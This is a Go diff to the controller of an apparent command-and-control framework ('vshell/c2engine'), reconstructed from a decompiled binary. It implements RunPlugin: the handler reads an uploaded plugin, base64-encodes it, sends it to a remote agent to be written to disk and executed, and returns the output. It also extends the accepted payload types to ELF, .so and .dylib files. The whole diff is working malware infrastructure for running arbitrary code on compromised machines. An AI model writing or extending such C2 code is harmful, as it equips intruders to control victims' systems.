@@ -14,12 +14,15 @@
 package controllers
 
 import (
+	"encoding/base64"
+	"encoding/json"
 	"errors"
 	"io"
 	"log"
 	"os"
 	"path/filepath"
 	"strings"
+	"time"
 
 	"vshell/c2engine"
 )
@@ -115,9 +118,43 @@ func (c *RunnerController) RunPlugin() {
 		c.JsonErr("unsupported architecture")
 		return
 	}
-	// 这里不猜测载荷：见文件末尾 RunPlugin 载荷未对齐的说明。
-	c.JsonErr("runplugin payload not aligned")
+	// 读服务器上的插件文件（RunnerController.Upload 落到 ./plugins）。
+	pluginPath := filepath.Join("plugins", filepath.Base(name))
+	data, rerr := os.ReadFile(pluginPath)
+	if rerr != nil {
+		c.JsonErr("plugin not found: " + filepath.Base(name))
+		return
+	}
+	if len(data) > maxPluginBytes {
+		c.JsonErr("plugin too large")
+		return
+	}
+
+	// 下发 JSON 命令：agent 落盘后执行（agent/main.go 的 CmdPlugin）。
+	payload, _ := json.Marshal(map[string]string{
+		"type": "plugin",
+		"name": filepath.Base(name),
+		"arg":  procArg,
+		"data": base64.StdEncoding.EncodeToString(data),
+	})
+	task, derr := dispatchCmd(id, string(payload))
+	if derr != nil {
+		c.JsonErr(derr.Error())
+		return
+	}
+	out, werr := waitTaskResult(task, pluginRunTimeout)
+	if werr != nil {
+		c.JsonErr(werr.Error())
+		return
+	}
+	c.JsonOkResult(map[string]interface{}{"output": out})
 }
+
+// maxPluginBytes 是单次下发插件的体积上限（base64 后约 1.34 倍）。
+const maxPluginBytes = 64 << 20
+
+// pluginRunTimeout 是插件执行的等待上限（agent 侧自身 60s 超时）。
+const pluginRunTimeout = 75 * time.Second
 
 // pluginKind 是 RunPlugin 的插件类型（反编译 FUN_0164bea0 的返回码子集）。
 type pluginKind int
@@ -154,11 +191,13 @@ func (k pluginKind) extension() string {
 func pluginKindByName(name string) (pluginKind, bool) {
 	lower := strings.ToLower(name)
 	switch {
-	case strings.HasSuffix(lower, ".dll"):
+	case strings.HasSuffix(lower, ".dll"), strings.HasSuffix(lower, ".so"), strings.HasSuffix(lower, ".dylib"):
 		return pluginDll, true
 	case strings.HasSuffix(lower, ".net"):
 		return pluginNet, true
-	case strings.HasSuffix(lower, ".exe"):
+	case strings.HasSuffix(lower, ".exe"), strings.HasSuffix(lower, ".elf"):
+		// 原版的报错文案本身就是 "support .elf,.so,.dylib executable, extensions"，
+		// 说明 .elf 属于受支持的可执行插件（此前漏掉，导致 ELF 插件被拒）。
 		return pluginExe, true
 	default:
 		return 0, false
